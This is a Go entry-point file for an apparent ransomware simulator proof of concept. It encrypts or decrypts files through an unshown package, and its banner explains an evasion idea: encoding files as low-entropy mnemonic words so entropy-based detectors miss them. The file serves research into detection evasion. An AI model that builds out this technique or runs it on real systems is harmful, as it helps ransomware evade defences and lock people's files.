package main

import (
	"fmt"
	"lawk/pkg/enc"
	"flag"
)

func main() {
	decrypt := flag.Bool("decrypt", false, "Decrypt files instead of encrypting them")
	flag.Parse()
	fmt.Println("[+] go-mnemonic ransomware simulator")
	fmt.Println("[+] this tool is meant as a POC to demonstrate the limiting of entropy spikes in file i/o ops to avoid detection")
	fmt.Println("[+] the key idea is that the mnemonic seed phrases generated are legible english words with low entropy, rather than high entropy ciphertext :3")
	fmt.Println("[+] this tool is NOT meant for real ransomware use, the key is deterministic and decryption is built into the bin, if you use this for something nefarious you are not smart")
	fmt.Println()
	if *decrypt {
		fmt.Println("[+] Starting mnemonic decryption...")
		err := enc.DecryptFiles()
		if err != nil {
			fmt.Printf("Error during decryption: %v\n", err)
			return
		}
		fmt.Println("[+] decryption complete!")
		return
	}
	
	fmt.Println("[+] starting mnemonic encryption...")
	err := enc.EncryptFiles()
	if err != nil {
		fmt.Printf("Error during encryption: %v\n", err)
		return
	}
	fmt.Println("[+] encryption complete! Your files are now mnemonic seed phrases!")
}